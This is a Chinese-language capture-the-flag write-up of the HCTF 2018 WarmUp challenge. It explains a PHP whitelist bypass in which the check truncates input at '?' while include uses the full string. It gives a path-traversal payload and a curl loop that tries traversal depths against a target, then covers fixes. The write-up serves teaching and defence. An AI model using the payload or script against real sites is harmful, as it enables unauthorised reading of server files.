# CTF 练习：[HCTF 2018]WarmUp（文件包含 + 白名单绕过）

> 平台：CTF² / BUUCTF 练习（Web · 简单 · 1 分，8383 人解出）
> 环境：Kali Linux，浏览器 + curl
> 日期：2026-11-17
> 性质：平台提供的授权靶场

---

## 一、目标

一个 PHP 页面存在文件包含，带白名单校验。绕过校验读取 `ffffllllaaaagggg` 文件，拿到 flag。

## 二、侦察

### 2.1 首页源码

访问首页，`Ctrl + U` 看源码，注释提示存在 `source.php`。

### 2.2 source.php 的关键逻辑

```php
class emmm {
    public static function checkFile(&$page) {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
        if (!isset($page) || !is_string($page)) return false;
        if (in_array($page, $whitelist)) return true;

        $_page = mb_substr($page, 0, mb_strpos($page.'?', '?'));   // 截断到 '?'
        if (in_array($_page, $whitelist)) return true;

        $_page = urldecode($page);
        $_page = mb_substr($_page, 0, mb_strpos($_page.'?', '?'));
        if (in_array($_page, $whitelist)) return true;

        return false;
    }
}

if (!empty($_REQUEST['file']) && is_string($_REQUEST['file'])
    && emmm::checkFile($_REQUEST['file'])) {
    include $_REQUEST['file'];   // ← 执行用的是完整字符串
    exit;
} else {
    echo '<br><img src="..." />';
}
```

### 2.3 hint.php

```
flag not here, and flag in ffffllllaaaagggg
```

flag 文件名叫 `ffffllllaaaagggg`。

## 三、漏洞点

**检查与执行用的不是同一个字符串**：

| 阶段 | 使用的值 |
|---|---|
| `checkFile()` | `mb_substr($page, 0, strpos($page.'?','?'))` → 只看到 `?` 之前 |
| `include` | 完整的 `$_REQUEST['file']` |

所以构造：

```
?file=source.php?/../../../../ffffllllaaaagggg
```

- 检查时只看到 `source.php` → 通过白名单
- 执行时按完整路径，`/../../` 向上跳目录，最后包含 flag 文件

## 四、复现

```bash
T="http://目标地址"
# 先确认入口
curl "$T/source.php"
curl "$T/hint.php"

# 试不同层数
for p in source.php hint.php; do
  for n in 1 2 3 4 5 6 7 8; do
    up=$(printf '../%.0s' $(seq 1 $n))
    echo "=== $p / $n 层 ==="
    curl -s "${T}/index.php?file=${p}?/${up}ffffllllaaaagggg" | head -c 300
    echo
  done
done
```

某一层会直接输出 `flag{...}`。

## 四·五、复盘四问

### 推理链（为什么这么做）

**第 1 步：为什么先看首页源码**

- 我在想：这类题习惯把入口（source.php）写进注释。
- 验证：注释里确实提到 `source.php`。
- 所以：先去读源码，而不是盲试参数。

**第 2 步：为什么读 `source.php` 而不是直接传 `?file=`**

- 我在想：要搞清楚白名单怎么校验、执行用的什么变量。
- 验证：`checkFile()` 用 `mb_substr(...,'?')` 截断后比对，`include` 用的是**原串**。
- 所以：校验和执行不是同一个字符串，这就是绕过点。

**第 3 步：为什么 payload 用 `source.php?/../../....`**

- 我在想：`?` 之后的内容在校验时被丢掉，执行时却保留。
- 验证：校验看到 `source.php` 通过白名单，执行时走路径穿越。
- 所以：既能过白名单，又能跳出目录。

**第 4 步：为什么要从 2 层试到 8 层**

- 我在想：flag 文件的目录深度未知。
- 验证：脚本循环 `../` 次数，某一层直接输出 flag。
- 所以：遍历深度比猜更可靠。

### 载荷是怎么来的

- **来源**：根据 `checkFile` 的截断逻辑构造。
- **`?` 的作用**：利用「校验截断、执行不截断」的不一致。
- **`../` 的数量**：未知，用循环试。

### 逐段解释

| 片段 | 作用 |
|---|---|
| `source.php?` | 让校验只看到白名单里的名字 |
| `?/` | 把 `?` 后面的内容保留给 include 解析 |
| `../` ×n | 向上跳目录 |
| `ffffllllaaaagggg` | hint.php 给出的真实文件名 |

### 失败尝试与坑

| 现象 | 原因 | 解决 |
|---|---|---|
| 一直 404 | 入口不是 `/index.php?file=` | 换 `/?file=` 或 `source.php?file=` |
| 层数不对 | flag 深度未知 | 2~8 层遍历 |
| shell 截断 URL | `?` 在 shell 里有含义 | 整个 URL 加引号 |

### 自测

**Q1**：白名单为什么没防住？
**A**：校验时截断到 `?` 之前，执行时用完整字符串，两者不一致。

**Q2**：为什么 payload 必须带 `?`？
**A**：没有 `?` 就没有「校验看到 A、执行看到 B」的差异。

**Q3**：正确修复思路？
**A**：用固定映射表包含文件，不把用户输入拼进路径。

## 五、原理

1. **文件包含**：`include $_REQUEST['file']` 直接使用用户输入。
2. **白名单形同虚设**：校验函数对输入做了截断（`?` 之后被丢弃），但执行端用的是原串。
3. **路径穿越**：`../` 可以跳出网站根目录，读到系统任意可读文件。

**本质：校验的数据 ≠ 执行的数据（TOCTOU 式不一致）。**

## 六、修复

| 措施 | 说明 |
|---|---|
| 不动态包含用户输入 | 用固定映射表：`['a' => 'a.php', 'b' => 'b.php']` |
| 强校验 | `realpath()` + `basename()`，确认路径在允许目录内 |
| 关闭远程包含 | `allow_url_include = Off` |
| 最小权限 | Web 进程只读必要目录 |

正确的白名单写法：

```php
$allow = ['source' => 'source.php', 'hint' => 'hint.php'];
$key = $_GET['file'];
if (isset($allow[$key])) {
    include __DIR__ . '/' . $allow[$key];
}
```

## 七、踩坑

1. **层数不确定**：flag 文件所在目录深度未知，`../` 从 2 层试到 8 层。
2. **入口路径**：可能是 `/index.php?file=`，也可能是 `/?file=`，404 就换。
3. **URL 里的 `?`**：放在 query 里要整体加引号，否则 shell 会截断。
4. **hint.php 文件名**：以实际输出为准，别照抄。

## 八、收获

- 理解了「白名单校验被截断绕过」这种经典模式。
- 复习了文件包含 + 路径穿越的组合利用。
- 认识到：**校验逻辑必须和最终执行逻辑使用同一份规范化后的数据**。
